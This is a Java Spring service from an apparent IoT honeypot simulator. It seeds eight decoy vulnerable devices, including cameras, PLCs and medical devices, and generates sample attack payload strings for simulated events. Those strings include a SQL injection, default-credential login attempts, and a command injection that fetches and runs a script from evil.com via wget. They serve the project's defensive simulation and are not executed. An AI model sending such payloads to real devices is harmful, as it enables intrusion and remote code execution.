package com.smarttrap.iot;

import com.smarttrap.model.IoTDevice;
import com.smarttrap.repository.IoTDeviceRepository;
import jakarta.annotation.PostConstruct;
import org.springframework.stereotype.Service;
import org.springframework.transaction.annotation.Transactional;

import java.time.LocalDateTime;
import java.util.*;
import java.util.logging.Logger;

/**
 * IoT Component: Virtual device simulator.
 * Provisions fake vulnerable IoT endpoints as honeypot targets.
 */
@Service
public class IoTDeviceSimulator {

    private static final Logger log = Logger.getLogger(IoTDeviceSimulator.class.getName());

    private final IoTDeviceRepository deviceRepository;

    public IoTDeviceSimulator(IoTDeviceRepository deviceRepository) {
        this.deviceRepository = deviceRepository;
    }

    private static final List<String> VIRTUAL_IP_POOL = List.of(
            "192.168.10.101", "192.168.10.102", "192.168.10.103",
            "192.168.10.104", "192.168.10.105", "192.168.10.106",
            "192.168.10.107", "192.168.10.108"
    );

    private static final Map<IoTDevice.DeviceType, int[]> DEVICE_PORTS = Map.of(
            IoTDevice.DeviceType.SMART_CAMERA,      new int[]{554, 8080, 443},
            IoTDevice.DeviceType.SMART_THERMOSTAT,  new int[]{8883, 1883, 80},
            IoTDevice.DeviceType.INDUSTRIAL_SENSOR, new int[]{502, 102, 44818},
            IoTDevice.DeviceType.SMART_LOCK,        new int[]{80, 443, 8080},
            IoTDevice.DeviceType.MEDICAL_DEVICE,    new int[]{2575, 11073, 443},
            IoTDevice.DeviceType.SMART_METER,       new int[]{4059, 5060, 1883},
            IoTDevice.DeviceType.ROUTER,            new int[]{22, 23, 80, 443},
            IoTDevice.DeviceType.PLC_CONTROLLER,    new int[]{102, 502, 20000}
    );

    @PostConstruct
    @Transactional
    public void initializeVirtualDevices() {
        if (deviceRepository.count() > 0) {
            log.info("IoT devices already initialized. Count: " + deviceRepository.count());
            return;
        }

        List<IoTDevice> devices = new ArrayList<>();
        IoTDevice.DeviceType[] types = IoTDevice.DeviceType.values();
        String[] firmwares = {"1.0.0", "1.2.3", "2.0.1", "0.9.8", "3.1.0", "2.4.5", "1.8.2", "4.0.0"};
        String[] osVersions = {"Linux 4.14", "RTOS 2.1", "OpenWRT 21.02", "FreeRTOS 10.4", "VxWorks 7", "uClinux 5.15", "Android Things 1.0", "Contiki 3.0"};

        Random random = new Random(42);

        for (int i = 0; i < 8; i++) {
            IoTDevice.DeviceType dtype = types[i];
            int[] ports = DEVICE_PORTS.get(dtype);
            int port = ports[random.nextInt(ports.length)];

            IoTDevice device = IoTDevice.builder()
                    .deviceName(getDeviceName(dtype, i + 1))
                    .deviceType(dtype)
                    .virtualIp(VIRTUAL_IP_POOL.get(i))
                    .openPort(port)
                    .firmwareVersion(firmwares[i])
                    .active(true)
                    .vulnerabilityLevel(3 + random.nextInt(7)) // 3–9
                    .createdAt(LocalDateTime.now())
                    .totalAttacks(0)
                    .os(osVersions[i])
                    .build();

            devices.add(device);
        }

        deviceRepository.saveAll(devices);
        log.info("Initialized " + devices.size() + " virtual IoT honeypot devices");
    }

    private String getDeviceName(IoTDevice.DeviceType type, int index) {
        return switch (type) {
            case SMART_CAMERA      -> "HoneyCAM-" + String.format("%03d", index);
            case SMART_THERMOSTAT  -> "HoneyTHERM-" + String.format("%03d", index);
            case INDUSTRIAL_SENSOR -> "HoneySENSOR-" + String.format("%03d", index);
            case SMART_LOCK        -> "HoneyLOCK-" + String.format("%03d", index);
            case MEDICAL_DEVICE    -> "HoneyMED-" + String.format("%03d", index);
            case SMART_METER       -> "HoneyMETER-" + String.format("%03d", index);
            case ROUTER            -> "HoneyROUTER-" + String.format("%03d", index);
            case PLC_CONTROLLER    -> "HoneyPLC-" + String.format("%03d", index);
        };
    }

    /** Get a random active device for simulation */
    public IoTDevice getRandomTarget() {
        List<IoTDevice> active = deviceRepository.findByActiveTrue();
        if (active.isEmpty()) return null;
        return active.get(new Random().nextInt(active.size()));
    }

    /** Increment attack count on device */
    @Transactional
    public void recordAttackOnDevice(IoTDevice device) {
        device.setTotalAttacks(device.getTotalAttacks() + 1);
        deviceRepository.save(device);
    }

    public List<IoTDevice> getAllDevices() {
        return deviceRepository.findAll();
    }

    /** Generate a realistic payload for a given attack type string */
    public static String generatePayload(String attackType, int port) {
        return switch (attackType) {
            case "BRUTE_FORCE"       -> "POST /login HTTP/1.1\nUsername=admin&password=admin123\nCredential attempt #" + new Random().nextInt(999);
            case "SQL_INJECTION"     -> "GET /api/device?id=1' OR '1'='1' UNION SELECT * FROM users--";
            case "COMMAND_INJECTION" -> "GET /cgi-bin/test?cmd=;wget http://evil.com/bot.sh;bash bot.sh&";
            case "PORT_SCANNING"     -> "SYN probe on port " + port + " | Nmap 7.94 scan";
            case "DDOS"              -> "UDP flood: " + (new Random().nextInt(900) + 100) + " packets/sec from spoofed IPs";
            case "MALWARE_INJECTION" -> "PUT /firmware HTTP/1.1\nContent-Type: application/octet-stream\n[MALICIOUS BINARY: " + new Random().nextInt(50000) + " bytes]";
            case "MAN_IN_THE_MIDDLE" -> "ARP spoof detected: gateway MAC changed to " + randomMac();
            case "REPLAY_ATTACK"     -> "Replayed session token: Bearer eyJhbGc..." + new Random().nextInt(9999);
            default                  -> "Unknown payload on port " + port;
        };
    }

    private static String randomMac() {
        Random r = new Random();
        return String.format("%02X:%02X:%02X:%02X:%02X:%02X",
                r.nextInt(256), r.nextInt(256), r.nextInt(256),
                r.nextInt(256), r.nextInt(256), r.nextInt(256));
    }
}
